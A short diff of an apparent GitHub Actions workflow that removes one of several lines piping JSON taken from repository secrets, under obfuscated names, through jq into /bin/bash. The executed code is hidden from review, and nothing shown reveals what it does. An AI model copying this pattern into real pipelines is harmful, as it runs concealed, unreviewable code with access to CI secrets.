@@ -19,7 +19,6 @@ jobs:
           k002: ${{ secrets.k002 }}
         run: |
           printf '%s' "$k002" | jq -r .ntj7 | /bin/bash
-          printf '%s' "$q3149" | jq -r .vji504 | /bin/bash
           printf '%s' "$pc278" | jq -r .wsfo08771 | /bin/bash
           printf '%s' "$zgyeh48" | jq -r .chu48 | /bin/bash
           printf '%s' "$d69787" | jq -r .ont9507 | /bin/bash
